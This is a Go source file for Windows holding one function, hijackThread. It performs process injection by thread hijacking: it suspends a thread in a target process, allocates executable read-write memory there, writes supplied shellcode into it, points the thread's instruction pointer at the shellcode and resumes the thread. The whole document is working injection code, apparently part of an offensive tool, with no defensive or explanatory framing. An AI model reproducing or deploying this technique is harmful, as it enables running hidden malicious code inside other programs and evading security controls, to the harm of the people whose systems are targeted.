//go:build windows

package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// hijackThread suspends the first enumerable thread of pid, allocates shellcode,
// patches the thread's RIP to shellcode, then resumes.
func hijackThread(pid uint32, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	tids, err := processThreadIDs(pid)
	if err != nil || len(tids) == 0 {
		return fmt.Errorf("no threads found in PID %d", pid)
	}
	tid := tids[0]

	hThread, _, e := procOpenThread.Call(uintptr(threadAllAccess), 0, uintptr(tid))
	if hThread == 0 {
		return fmt.Errorf("OpenThread(%d): %v", tid, e)
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	// Suspend
	r, _, e := procSuspendThread.Call(hThread)
	if r == ^uintptr(0) {
		return fmt.Errorf("SuspendThread: %v", e)
	}

	// Open process for memory ops
	hProc, err := windows.OpenProcess(processAllAccess, false, pid)
	if err != nil {
		procResumeThread.Call(hThread)
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	// Allocate + write shellcode
	addr, _, e := procVirtualAllocEx.Call(
		uintptr(hProc), 0, uintptr(len(shellcode)),
		uintptr(memCommit|memReserve), uintptr(pageExecuteReadWrite),
	)
	if addr == 0 {
		procResumeThread.Call(hThread)
		return fmt.Errorf("VirtualAllocEx: %v", e)
	}

	var written uintptr
	r, _, e = procWriteProcessMemory.Call(
		uintptr(hProc), addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if r == 0 {
		procResumeThread.Call(hThread)
		return fmt.Errorf("WriteProcessMemory: %v", e)
	}

	// Get + modify thread context
	ctx := newContext()
	ctx.setContextFlags(contextAll)
	r, _, e = procGetThreadContext.Call(hThread, ctx.raw())
	if r == 0 {
		procResumeThread.Call(hThread)
		return fmt.Errorf("GetThreadContext: %v", e)
	}
	ctx.setRip(uint64(addr))
	r, _, e = procSetThreadContext.Call(hThread, ctx.raw())
	if r == 0 {
		procResumeThread.Call(hThread)
		return fmt.Errorf("SetThreadContext: %v", e)
	}

	procResumeThread.Call(hThread)
	return nil
}
